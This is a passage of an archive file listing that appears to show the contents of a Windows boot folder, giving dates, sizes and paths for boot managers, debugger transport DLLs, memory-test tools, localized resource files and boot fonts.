EFI/tr-TR 2025-02-16 11:05:50 D.... EFI/uk-UA 2025-02-16 11:05:50 D.... EFI/zh-CN 2025-02-16 11:05:50 D.... EFI/zh-TW 2025-02-16 11:05:50 D.... EFI_EX/bg-BG 2025-02-16 11:05:50 D.... EFI_EX/cs-CZ 2025-02-16 11:05:50 D.... EFI_EX/da-DK 2025-02-16 11:05:50 D.... EFI_EX/de-DE 2025-02-16 11:05:50 D.... EFI_EX/el-GR 2025-02-16 11:05:50 D.... EFI_EX/en-GB 2025-02-16 11:05:50 D.... EFI_EX/en-US 2025-02-16 11:05:50 D.... EFI_EX/es-ES 2025-02-16 11:05:50 D.... EFI_EX/es-MX 2025-02-16 11:05:50 D.... EFI_EX/et-EE 2025-02-16 11:05:50 D.... EFI_EX/fi-FI 2025-02-16 11:05:50 D.... EFI_EX/fr-CA 2025-02-16 11:05:50 D.... EFI_EX/fr-FR 2025-02-16 11:05:50 D.... EFI_EX/hr-HR 2025-02-16 11:05:50 D.... EFI_EX/hu-HU 2025-02-16 11:05:50 D.... EFI_EX/it-IT 2025-02-16 11:05:50 D.... EFI_EX/ja-JP 2025-02-16 11:05:50 D.... EFI_EX/ko-KR 2025-02-16 11:05:50 D.... EFI_EX/lt-LT 2025-02-16 11:05:50 D.... EFI_EX/lv-LV 2025-02-16 11:05:50 D.... EFI_EX/nb-NO 2025-02-16 11:05:50 D.... EFI_EX/nl-NL 2025-02-16 11:05:50 D.... EFI_EX/pl-PL 2025-02-16 11:05:50 D.... EFI_EX/pt-BR 2025-02-16 11:05:50 D.... EFI_EX/pt-PT 2025-02-16 11:05:50 D.... EFI_EX/ro-RO 2025-02-16 11:05:50 D.... EFI_EX/ru-RU 2025-02-16 11:05:50 D.... EFI_EX/sk-SK 2025-02-16 11:05:50 D.... EFI_EX/sl-SI 2025-02-16 11:05:50 D.... EFI_EX/sr-Latn-RS 2025-02-16 11:05:50 D.... EFI_EX/sv-SE 2025-02-16 11:05:50 D.... EFI_EX/tr-TR 2025-02-16 11:05:50 D.... EFI_EX/uk-UA 2025-02-16 11:05:50 D.... EFI_EX/zh-CN 2025-02-16 11:05:50 D.... EFI_EX/zh-TW 2025-02-16 11:05:48 D.... Misc/PCAT 2025-02-16 11:05:50 D.... PCAT/bg-BG 2025-02-16 11:05:50 D.... PCAT/cs-CZ 2025-02-16 11:05:50 D.... PCAT/da-DK 2025-02-16 11:05:50 D.... PCAT/de-DE 2025-02-16 11:05:50 D.... PCAT/el-GR 2025-02-16 11:05:50 D.... PCAT/en-GB 2025-02-16 11:05:50 D.... PCAT/en-US 2025-02-16 11:05:50 D.... PCAT/es-ES 2025-02-16 11:05:50 D.... PCAT/es-MX 2025-02-16 11:05:50 D.... PCAT/et-EE 2025-02-16 11:05:50 D.... PCAT/fi-FI 2025-02-16 11:05:50 D.... PCAT/fr-CA 2025-02-16 11:05:50 D.... PCAT/fr-FR 2025-02-16 11:05:50 D.... PCAT/hr-HR 2025-02-16 11:05:50 D.... PCAT/hu-HU 2025-02-16 11:05:50 D.... PCAT/it-IT 2025-02-16 11:05:50 D.... PCAT/ja-JP 2025-02-16 11:05:50 D.... PCAT/ko-KR 2025-02-16 11:05:50 D.... PCAT/lt-LT 2025-02-16 11:05:50 D.... PCAT/lv-LV 2025-02-16 11:05:50 D.... PCAT/nb-NO 2025-02-16 11:05:50 D.... PCAT/nl-NL 2025-02-16 11:05:50 D.... PCAT/pl-PL 2025-02-16 11:05:50 D.... PCAT/pt-BR 2025-02-16 11:05:50 D.... PCAT/pt-PT 2025-02-16 11:05:50 D.... PCAT/qps-ploc 2025-02-16 11:05:50 D.... PCAT/qps-plocm 2025-02-16 11:05:50 D.... PCAT/ro-RO 2025-02-16 11:05:50 D.... PCAT/ru-RU 2025-02-16 11:05:50 D.... PCAT/sk-SK 2025-02-16 11:05:50 D.... PCAT/sl-SI 2025-02-16 11:05:50 D.... PCAT/sr-Latn-RS 2025-02-16 11:05:50 D.... PCAT/sv-SE 2025-02-16 11:05:50 D.... PCAT/tr-TR 2025-02-16 11:05:50 D.... PCAT/uk-UA 2025-02-16 11:05:50 D.... PCAT/zh-CN 2025-02-16 11:05:50 D.... PCAT/zh-TW 2021-05-08 09:35:26 D.... Resources/en-US 2021-05-08 08:14:21 ....A 91 91 BootDebuggerFiles.ini 2025-02-16 11:02:00 ....A 16384 3503 DVD/EFI/BCD 2021-05-08 08:16:00 ....A 3170304 164531 DVD/EFI/boot.sdi 2021-05-08 08:16:00 ....A 3170304 164531 DVD/PCAT/boot.sdi 2025-02-16 11:02:02 ....A 1474560 539941 DVD/EFI/en-US/efisys.bin 2025-02-16 11:02:00 ....A 16384 3340 DVD/PCAT/BCD 2025-02-16 11:02:02 ....A 1474560 539918 DVD/EFI/en-US/efisys_noprompt.bin 2025-02-16 11:02:02 ....A 4096 1752 DVD/PCAT/etfsboot.com 2025-02-16 11:01:57 ....A 1024 537 DVD/PCAT/en-US/bootfix.bin 2025-02-16 11:02:02 ....A 1474560 617657 DVD_EX/EFI/en-US/efisys_EX.bin 2025-02-16 11:00:54 ....A 11030 7894 EFI/boot.stl 2025-02-16 11:02:02 ....A 1474560 617796 DVD_EX/EFI/en-US/efisys_noprompt_EX.bin 2025-02-16 11:00:54 ....A 2033656 1157503 EFI/bootmgfw.efi 2021-05-08 08:14:43 ....A 53576 8360 EFI/kdnet_uart16550.dll 2025-02-16 11:00:57 ....A 83424 27703 EFI/kdstub.dll 2025-02-16 11:00:54 ....A 2017288 1150729 EFI/bootmgr.efi 2021-05-08 08:14:43 ....A 65864 15527 EFI/kd_02_10df.dll 2021-05-08 08:14:43 ....A 61768 12930 EFI/kd_02_1137.dll 2021-05-08 08:14:43 ....A 270664 115260 EFI/kd_02_14e4.dll 2021-05-08 08:14:43 ....A 430416 148754 EFI/kd_02_10ec.dll 2021-05-08 08:14:43 ....A 82248 24980 EFI/kd_02_15b3.dll 2021-05-08 08:14:43 ....A 78136 20785 EFI/kd_02_1969.dll 2021-05-08 08:14:43 ....A 57680 10537 EFI/kd_02_1af4.dll 2021-05-08 08:14:43 ....A 65872 15504 EFI/kd_02_19a2.dll 2021-05-08 08:14:43 ....A 53584 8782 EFI/kd_07_1415.dll 2021-05-08 08:14:43 ....A 328008 146666 EFI/kd_02_8086.dll 2021-05-08 08:14:43 ....A 82248 27597 EFI/kd_0C_8086.dll 2025-02-16 11:00:54 ....A 162192 91750 EFI/SecureBootRecovery.efi 2021-05-08 08:14:21 ....A 9796 3736 EFI/winsipolicy.p7b 2025-02-16 11:01:07 ....A 82440 17377 EFI/bg-BG/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 82408 17370 EFI/bg-BG/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 81416 17162 EFI/cs-CZ/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81416 17160 EFI/cs-CZ/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12783 EFI/cs-CZ/memtest.efi.mui 2025-02-16 11:00:54 ....A 1808880 1043290 EFI/memtest.efi 2025-02-16 11:01:07 ....A 80392 16549 EFI/da-DK/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 80376 16555 EFI/da-DK/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12726 EFI/da-DK/memtest.efi.mui 2025-02-16 11:01:07 ....A 84472 17832 EFI/de-DE/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 84488 17820 EFI/de-DE/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45896 12801 EFI/de-DE/memtest.efi.mui 2025-02-16 11:01:07 ....A 85472 18603 EFI/el-GR/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 46408 13160 EFI/el-GR/memtest.efi.mui 2025-02-16 11:01:07 ....A 85480 18618 EFI/el-GR/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 78344 16094 EFI/en-GB/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 78320 16105 EFI/en-GB/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 78344 16101 EFI/en-US/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 78344 16095 EFI/en-US/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 44872 12471 EFI/en-US/memtest.efi.mui 2025-02-16 11:01:07 ....A 82400 17007 EFI/es-ES/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 45896 12824 EFI/es-ES/memtest.efi.mui 2025-02-16 11:01:07 ....A 82424 17027 EFI/es-ES/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 82400 16979 EFI/es-MX/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 82424 16995 EFI/es-MX/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 79328 16328 EFI/et-EE/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 79368 16344 EFI/et-EE/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 81416 16781 EFI/fi-FI/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81416 16773 EFI/fi-FI/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12757 EFI/fi-FI/memtest.efi.mui 2025-02-16 11:01:07 ....A 84448 17736 EFI/fr-CA/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 84472 17754 EFI/fr-CA/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 84488 17751 EFI/fr-FR/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 84488 17749 EFI/fr-FR/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45904 12805 EFI/fr-FR/memtest.efi.mui 2025-02-16 11:01:07 ....A 81416 17025 EFI/hr-HR/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81392 17034 EFI/hr-HR/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 84440 17951 EFI/hu-HU/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 45896 12854 EFI/hu-HU/memtest.efi.mui 2025-02-16 11:01:07 ....A 84464 17988 EFI/hu-HU/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 81928 16773 EFI/it-IT/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81912 16773 EFI/it-IT/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12701 EFI/it-IT/memtest.efi.mui 2025-02-16 11:01:07 ....A 70640 16292 EFI/ja-JP/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 70664 16298 EFI/ja-JP/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 42824 12470 EFI/ja-JP/memtest.efi.mui 2025-02-16 11:01:07 ....A 70152 16253 EFI/ko-KR/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 70128 16267 EFI/ko-KR/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 42824 12477 EFI/ko-KR/memtest.efi.mui 2025-02-16 11:01:07 ....A 80392 16894 EFI/lt-LT/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 80376 16890 EFI/lt-LT/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 80352 16680 EFI/lv-LV/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 79880 16491 EFI/nb-NO/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 80376 16702 EFI/lv-LV/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 79856 16498 EFI/nb-NO/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12732 EFI/nb-NO/memtest.efi.mui 2025-02-16 11:01:07 ....A 82400 17052 EFI/nl-NL/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 82440 17056 EFI/nl-NL/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12683 EFI/nl-NL/memtest.efi.mui 2025-02-16 11:01:07 ....A 82952 17449 EFI/pl-PL/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 82952 17446 EFI/pl-PL/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45896 12853 EFI/pl-PL/memtest.efi.mui 2025-02-16 11:01:07 ....A 81416 16748 EFI/pt-BR/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81400 16744 EFI/pt-BR/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45384 12720 EFI/pt-BR/memtest.efi.mui 2025-02-16 11:01:07 ....A 81400 16811 EFI/pt-PT/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81416 16809 EFI/pt-PT/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 45904 12733 EFI/pt-PT/memtest.efi.mui 2021-05-08 08:14:34 ....A 54088 23751 EFI/qps-ploc/memtest.efi.mui 2025-02-16 11:01:07 ....A 80864 16853 EFI/ro-RO/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 80888 16869 EFI/ro-RO/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 81912 17472 EFI/ru-RU/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 44872 12886 EFI/ru-RU/memtest.efi.mui 2025-02-16 11:01:07 ....A 81904 17485 EFI/ru-RU/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 81888 17386 EFI/sk-SK/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81928 17394 EFI/sk-SK/bootmgr.efi.mui 2025-02-16 11:01:07 ....A 80888 16733 EFI/sl-SI/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 80888 16731 EFI/sl-SI/bootmgr.efi.mui 2025-02-16 11:01:06 ....A 81888 17163 EFI/sr-Latn-RS/bootmgfw.efi.mui 2025-02-16 11:01:07 ....A 81928 17173 EFI/sr-Latn-RS/bootmgr.efi.mui 2025-02-16 11:01:06 ....A 80864 16457 EFI/sv-SE/bootmgfw.efi.mui 2025-02-16 11:01:06 ....A 80904 16471 EFI/sv-SE/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 44872 12688 EFI/sv-SE/memtest.efi.mui 2025-02-16 11:01:06 ....A 80368 16577 EFI/tr-TR/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 45384 12752 EFI/tr-TR/memtest.efi.mui 2025-02-16 11:01:06 ....A 80392 16564 EFI/tr-TR/bootmgr.efi.mui 2025-02-16 11:01:06 ....A 81928 17296 EFI/uk-UA/bootmgfw.efi.mui 2025-02-16 11:01:06 ....A 81912 17296 EFI/uk-UA/bootmgr.efi.mui 2025-02-16 11:01:06 ....A 66056 14880 EFI/zh-CN/bootmgfw.efi.mui 2025-02-16 11:01:06 ....A 66040 14884 EFI/zh-CN/bootmgr.efi.mui 2021-05-08 08:14:34 ....A 42312 12302 EFI/zh-CN/memtest.efi.mui 2025-02-16 11:01:06 ....A 66032 14952 EFI/zh-TW/bootmgr.efi.mui 2025-02-16 11:01:06 ....A 66056 14945 EFI/zh-TW/bootmgfw.efi.mui 2021-05-08 08:14:34 ....A 42312 12317 EFI/zh-TW/memtest.efi.mui 2025-02-16 11:00:54 ....A 2774808 1544372 EFI_EX/bootmgfw_EX.efi 2025-02-16 11:01:07 ....A 94624 18380 EFI_EX/bg-BG/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17641 EFI_EX/bg-BG/bootmgr_EX.efi.mui 2025-02-16 11:00:54 ....A 2758048 1542671 EFI_EX/bootmgr_EX.efi 2025-02-16 11:01:07 ....A 93504 18368 EFI_EX/cs-CZ/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17665 EFI_EX/cs-CZ/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 92600 17946 EFI_EX/da-DK/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90008 17657 EFI_EX/da-DK/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 97200 18658 EFI_EX/de-DE/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17631 EFI_EX/de-DE/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 97712 19370 EFI_EX/el-GR/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17657 EFI_EX/el-GR/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 89920 17518 EFI_EX/en-GB/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17661 EFI_EX/en-GB/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 89920 17514 EFI_EX/en-US/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89920 17513 EFI_EX/en-US/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94512 17932 EFI_EX/es-ES/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17653 EFI_EX/es-ES/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94528 17915 EFI_EX/es-MX/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17663 EFI_EX/es-MX/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 91080 17825 EFI_EX/et-EE/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17645 EFI_EX/et-EE/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93488 17819 EFI_EX/fi-FI/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17645 EFI_EX/fi-FI/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 96712 18543 EFI_EX/fr-CA/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17651 EFI_EX/fr-CA/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 96672 18511 EFI_EX/fr-FR/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17653 EFI_EX/fr-FR/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93600 18313 EFI_EX/hr-HR/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17651 EFI_EX/hr-HR/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 96672 18719 EFI_EX/hu-HU/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17649 EFI_EX/hu-HU/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94008 17869 EFI_EX/it-IT/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17655 EFI_EX/it-IT/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 81328 17091 EFI_EX/ja-JP/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17657 EFI_EX/ja-JP/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 80704 16697 EFI_EX/ko-KR/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90000 17658 EFI_EX/ko-KR/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 92480 18123 EFI_EX/lt-LT/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17635 EFI_EX/lt-LT/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 91960 17969 EFI_EX/lv-LV/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17631 EFI_EX/lv-LV/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 92064 17827 EFI_EX/nb-NO/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17655 EFI_EX/nb-NO/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94624 18147 EFI_EX/nl-NL/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17629 EFI_EX/nl-NL/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 95552 18322 EFI_EX/pl-PL/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17639 EFI_EX/pl-PL/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93504 17856 EFI_EX/pt-BR/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17655 EFI_EX/pt-BR/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93600 18013 EFI_EX/pt-PT/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17657 EFI_EX/pt-PT/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93104 18201 EFI_EX/ro-RO/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 89984 17635 EFI_EX/ro-RO/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94112 18726 EFI_EX/ru-RU/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90016 17663 EFI_EX/ru-RU/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94016 18436 EFI_EX/sk-SK/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17655 EFI_EX/sk-SK/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 93088 18210 EFI_EX/sl-SI/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17641 EFI_EX/sl-SI/bootmgr_EX.efi.mui 2025-02-16 11:01:07 ....A 94128 18353 EFI_EX/sr-Latn-RS/bootmgfw_EX.efi.mui 2025-02-16 11:01:07 ....A 90024 17665 EFI_EX/sr-Latn-RS/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 93088 17897 EFI_EX/sv-SE/bootmgfw_EX.efi.mui 2025-02-16 11:01:06 ....A 90024 17649 EFI_EX/sv-SE/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 92592 17957 EFI_EX/tr-TR/bootmgfw_EX.efi.mui 2025-02-16 11:01:06 ....A 90000 17654 EFI_EX/tr-TR/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 90024 17647 EFI_EX/uk-UA/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 93640 18584 EFI_EX/uk-UA/bootmgfw_EX.efi.mui 2025-02-16 11:01:06 ....A 90024 17653 EFI_EX/zh-CN/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 76192 15876 EFI_EX/zh-CN/bootmgfw_EX.efi.mui 2025-02-16 11:01:06 ....A 90016 17655 EFI_EX/zh-TW/bootmgr_EX.efi.mui 2025-02-16 11:01:06 ....A 76592 15846 EFI_EX/zh-TW/bootmgfw_EX.efi.mui 2025-02-16 11:01:12 ....A 3696800 2544262 Fonts/chs_boot.ttf 2025-02-16 11:01:12 ....A 3879532 2648022 Fonts/cht_boot.ttf 2025-02-16 11:01:13 ....A 1986952 1288474 Fonts/jpn_boot.ttf 2025-02-16 11:01:13 ....A 194056 120833 Fonts/malgunn_boot.ttf 2025-02-16 11:01:13 ....A 196488 121367 Fonts/malgun_boot.ttf 2025-02-16 11:01:13 ....A 2374120 1098439 Fonts/kor_boot.ttf 2025-02-16 11:01:13 ....A 164328 102655 Fonts/meiryon_boot.ttf 2025-02-16 11:01:13 ....A 165980 103518 Fonts/meiryo_boot.ttf 2025-02-16 11:01:13 ....A 181584 118193 Fonts/msjhn_boot.ttf 2025-02-16 11:01:12 ....A 173616 111774 Fonts/msyhn_boot.ttf 2025-02-16 11:01:13 ....A 183564 118749 Fonts/msjh_boot.ttf 2025-02-16 11:01:12 ....A 175416 111335 Fonts/msyh_boot.ttf 2025-02-16 11:00:31 ....A 45980 30569 Fonts/segmono_boot.ttf 2025-02-16 11:00:31 ....A 102840 58857 Fonts/segoen_slboot.ttf 2025-02-16 11:00:31 ....A 103076 57972 Fonts/segoe_slboot.ttf 2025-02-16 11:00:31 ....A 50192 27449 Fonts/wgl4_boot.ttf 2025-02-16 11:01:12 ....A 3696644 2544094 Fonts_EX/chs_boot_EX.ttf 2025-02-16 11:01:13 ....A 3879448 2647971 Fonts_EX/cht_boot_EX.ttf 2025-02-16 11:01:13 ....A 1986792 1288304 Fonts_EX/jpn_boot_EX.ttf 2025-02-16 11:01:13 ....A 199456 125197 Fonts_EX/malgunn_boot_EX.ttf 2025-02-16 11:01:13 ....A 202000 125681 Fonts_EX/malgun_boot_EX.ttf 2025-02-16 11:01:13 ....A 174064 110126 Fonts_EX/meiryon_boot_EX.ttf 2025-02-16 11:01:13 ....A 176040 110703 Fonts_EX/meiryo_boot_EX.ttf 2025-02-16 11:01:13 ....A 199100 132103 Fonts_EX/msjhn_boot_EX.ttf 2025-02-16 11:01:13 ....A 201364 133144 Fonts_EX/msjh_boot_EX.ttf 2025-02-16 11:01:12 ....A 187832 122698 Fonts_EX/msyhn_boot_EX.ttf 2025-02-16 11:01:12 ....A 189844 122605 Fonts_EX/msyh_boot_EX.ttf 2025-02-16 11:00:31 ....A 45772 30389 Fonts_EX/segmono_boot_EX.ttf 2025-02-16 11:00:31 ....A 102752 58804 Fonts_EX/segoen_slboot_EX.ttf 2025-02-16 11:00:31 ....A 102916 57801 Fonts_EX/segoe_slboot_EX.ttf 2025-02-16 11:00:31 ....A 50016 27240 Fonts_EX/wgl4_boot_EX.ttf 2025-02-16 11:01:13 ....A 2374060 1098395 Fonts_EX/kor_boot_EX.ttf 2025-02-16 11:01:06 ....A 209416 131193 Misc/PCAT/bootspaces.dll 2021-05-08 08:14:33 ....A 1 1 PCAT/bootnxt 2025-02-16 11:01:06 ....A 29704 18631 PCAT/bootuwf.dll 2025-02-16 11:01:06 ....A 104456 60096 PCAT/bootvhd.dll 2025-02-16 11:01:06 ....A 440686 415946 PCAT/bootmgr 2025-02-16 11:01:34 ....A 82440 17367 PCAT/bg-BG/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81400 17162 PCAT/cs-CZ/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12753 PCAT/cs-CZ/memtest.exe.mui 2025-02-16 11:01:34 ....A 80392 16543 PCAT/da-DK/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12690 PCAT/da-DK/memtest.exe.mui 2025-02-16 11:01:34 ....A 84464 17833 PCAT/de-DE/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12779 PCAT/de-DE/memtest.exe.mui 2025-02-16 11:01:31 ....A 1057248 635339 PCAT/memtest.exe 2025-02-16 11:01:34 ....A 85512 18613 PCAT/el-GR/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 46416 13130 PCAT/el-GR/memtest.exe.mui 2025-02-16 11:01:34 ....A 78304 16078 PCAT/en-GB/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 44880 12447 PCAT/en-US/memtest.exe.mui 2025-02-16 11:01:34 ....A 78304 16085 PCAT/en-US/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12790 PCAT/es-ES/memtest.exe.mui 2025-02-16 11:01:34 ....A 82416 17034 PCAT/es-ES/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 82440 16987 PCAT/es-MX/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 79368 16346 PCAT/et-EE/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81416 16775 PCAT/fi-FI/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 84464 17755 PCAT/fr-CA/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12733 PCAT/fi-FI/memtest.exe.mui 2025-02-16 11:01:34 ....A 84488 17739 PCAT/fr-FR/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12802 PCAT/fr-FR/memtest.exe.mui 2025-02-16 11:01:34 ....A 81392 17036 PCAT/hr-HR/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12818 PCAT/hu-HU/memtest.exe.mui 2025-02-16 11:01:34 ....A 81912 16763 PCAT/it-IT/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12667 PCAT/it-IT/memtest.exe.mui 2025-02-16 11:01:34 ....A 84472 17979 PCAT/hu-HU/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 70664 16288 PCAT/ja-JP/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 42832 12442 PCAT/ja-JP/memtest.exe.mui 2025-02-16 11:01:34 ....A 70152 16259 PCAT/ko-KR/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 42832 12445 PCAT/ko-KR/memtest.exe.mui 2025-02-16 11:01:34 ....A 80352 16872 PCAT/lt-LT/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 80392 16694 PCAT/lv-LV/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 79864 16489 PCAT/nb-NO/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12710 PCAT/nb-NO/memtest.exe.mui 2025-02-16 11:01:34 ....A 82424 17060 PCAT/nl-NL/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45392 12647 PCAT/nl-NL/memtest.exe.mui 2025-02-16 11:01:34 ....A 82952 17447 PCAT/pl-PL/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12831 PCAT/pl-PL/memtest.exe.mui 2021-05-08 08:15:07 ....A 45392 12684 PCAT/pt-BR/memtest.exe.mui 2025-02-16 11:01:34 ....A 81392 16741 PCAT/pt-BR/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81416 16803 PCAT/pt-PT/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 45904 12728 PCAT/pt-PT/memtest.exe.mui 2021-05-08 08:15:07 ....A 54096 23765 PCAT/qps-ploc/memtest.exe.mui 2025-02-16 11:01:34 ....A 82400 16613 PCAT/qps-plocm/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 89072 28604 PCAT/qps-ploc/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 80904 16869 PCAT/ro-RO/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81912 17472 PCAT/ru-RU/bootmgr.exe.mui 2021-05-08 08:15:07 ....A 44880 12862 PCAT/ru-RU/memtest.exe.mui 2025-02-16 11:01:34 ....A 80904 16725 PCAT/sl-SI/bootmgr.exe.mui 2025-02-16 11:01:34 ....A 81888 17157 